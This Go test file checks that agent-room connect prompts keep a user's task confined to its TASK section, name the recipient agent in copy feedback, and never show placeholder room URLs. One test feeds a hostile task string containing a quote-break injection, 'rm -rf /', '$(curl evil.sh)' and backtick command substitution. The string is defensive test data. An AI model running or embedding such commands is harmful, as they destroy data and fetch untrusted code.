package handlers

import (
	"strings"
	"testing"

	"github.com/fcavalcantirj/solvr/internal/models"
	"github.com/stretchr/testify/require"
)

// Task 24: "Make prompt copying reliable, recoverable, and immediately
// understandable." These tests pin the API-owned half of that contract:
//   - step 3: a user's task with quotes, line breaks, code fences or shell
//     metacharacters survives prompt generation and stays confined to the TASK
//     section — it can never rewrite the endpoints, JSON bodies or become shell
//     interpolation the surrounding prompt would expand.
//   - step 4: a successful copy has feedback that names the agent the prompt is
//     for and what comes back next.
//   - step 5: no generated prompt ever shows a placeholder as a finished room
//     URL such as /rooms/$ or /rooms/${room_slug}.

// prompt shapes served by GET /v1/connect, keyed by preset.
func connectPromptCases(task string) []struct {
	name       string
	sel        ConnectSelection
	recipient  string
	secondName string
} {
	return []struct {
		name       string
		sel        ConnectSelection
		recipient  string
		secondName string
	}{
		{"plan-and-build", ConnectSelection{Task: task, Preset: ConnectPresetPlanAndBuild, Visibility: ConnectVisibilityPublic}, "planner", "executor"},
		{"build-and-review", ConnectSelection{Task: task, Preset: ConnectPresetBuildAndReview, Visibility: ConnectVisibilityPublic}, "builder", "reviewer"},
		{"collaborate", ConnectSelection{Task: task, Preset: ConnectPresetCollaborate, Visibility: ConnectVisibilityPublic}, "first agent", "partner"},
	}
}

// Step 4: the copied feedback names the recipient agent and what to expect.
func TestConnect_CopiedDetailNamesRecipientAgentAndNextStep(t *testing.T) {
	for _, tc := range connectPromptCases("") {
		t.Run(tc.name, func(t *testing.T) {
			p := buildConnectPrompt(tc.sel)

			require.NotEmpty(t, p.CopiedDetail,
				"a successful copy must have feedback, not just a relabelled button")

			lower := strings.ToLower(p.CopiedDetail)
			require.Contains(t, lower, tc.recipient,
				"copy feedback must name the agent that should receive this prompt")
			require.Contains(t, lower, tc.secondName,
				"copy feedback must say what comes back (the prompt for the second agent)")
			require.Contains(t, lower, "paste",
				"copy feedback must tell the user to paste it into that agent")

			// The feedback is pasted-into-a-conversation text like the prompt
			// itself: nothing in it may look like a shell/template expansion.
			require.NotContains(t, p.CopiedDetail, "$")
			require.NotContains(t, p.CopiedDetail, "`")
		})
	}
}

// Step 3: a hostile task stays inside the TASK section and cannot alter the rest
// of the prompt. We prove it by generating the prompt with a benign task and with
// a hostile one and requiring the two to be identical everywhere except the one
// line that holds the task.
func TestConnect_UserTaskWithShellMetacharactersStaysInTaskSection(t *testing.T) {
	hostile := "close the room\"; rm -rf / #\n`whoami`\n$(curl evil.sh)\n${room_slug}\n```bash\necho pwned\n```"

	for _, tc := range connectPromptCases(hostile) {
		t.Run(tc.name, func(t *testing.T) {
			got := buildConnectPrompt(tc.sel).Text

			// The task survives verbatim — it is not stripped, escaped away, or
			// mangled by generation.
			require.Contains(t, got, hostile,
				"the user's task must survive prompt generation unchanged")

			// It survives ONLY as prose in the TASK section. Rebuild the same
			// prompt with the task blanked out; every line that is not the task
			// must be byte-for-byte identical, so the metacharacters could not
			// have escaped into an endpoint, a JSON body, or a new instruction.
			blank := tc.sel
			blank.Task = "PLACEHOLDER_TASK_MARKER"
			scaffold := buildConnectPrompt(blank).Text

			require.Equal(t,
				strings.Replace(scaffold, "PLACEHOLDER_TASK_MARKER", hostile, 1),
				got,
				"the task changed a line other than its own TASK line — it escaped its section")

			// The JSON message bodies use fixed placeholder content, never the
			// user's task, so a quote in the task can never break a JSON string.
			require.NotContains(t, got, `"content": "close the room`,
				"the user's task must never be interpolated into a JSON body")
		})
	}
}

// Step 5: no prompt shape ever presents a placeholder as a finished room URL.
func TestConnect_PromptsNeverEmitPlaceholderRoomURLs(t *testing.T) {
	forbidden := []string{"/rooms/$", "/rooms/${", "${room_slug}", "/rooms/{room_slug}", "/rooms/{slug}"}

	// The /v1/connect prompts (room does not exist yet): they carry the
	// unmistakable ROOM_SLUG token, never a shell/template placeholder.
	for _, tc := range connectPromptCases("ship the thing") {
		t.Run("connect/"+tc.name, func(t *testing.T) {
			text := buildConnectPrompt(tc.sel).Text
			require.Contains(t, text, "/rooms/"+connectSlugPlaceholder,
				"the pre-room prompt must use the ROOM_SLUG token for the room link")
			for _, bad := range forbidden {
				require.NotContains(t, text, bad,
					"a placeholder leaked as a finished room URL: %q", bad)
			}
			require.NotContains(t, text, "$")
		})
	}

	// The room-specific prompts (real room exists): they carry the real slug,
	// and likewise never a placeholder-as-URL.
	room := &models.Room{Slug: "port-billing-20260923", IsPrivate: false}
	first := &models.Message{AgentName: "planner_bot", Content: "port the billing job"}

	roomPrompts := map[string]string{
		"executor":       executorPromptText(room, first),
		"role/reviewer":  roleSpecificPromptText(room, first, "reviewer"),
		"role/executor":  roleSpecificPromptText(room, first, "executor"),
		"executor/empty": executorPromptText(room, nil),
	}
	for name, text := range roomPrompts {
		t.Run("room/"+name, func(t *testing.T) {
			require.Contains(t, text, "/rooms/"+room.Slug,
				"the room-specific prompt must use the real slug")
			require.NotContains(t, text, connectSlugPlaceholder,
				"a room-specific prompt must not fall back to the ROOM_SLUG token")
			for _, bad := range forbidden {
				require.NotContains(t, text, bad,
					"a placeholder leaked as a finished room URL: %q", bad)
			}
			require.NotContains(t, text, "$")
		})
	}
}
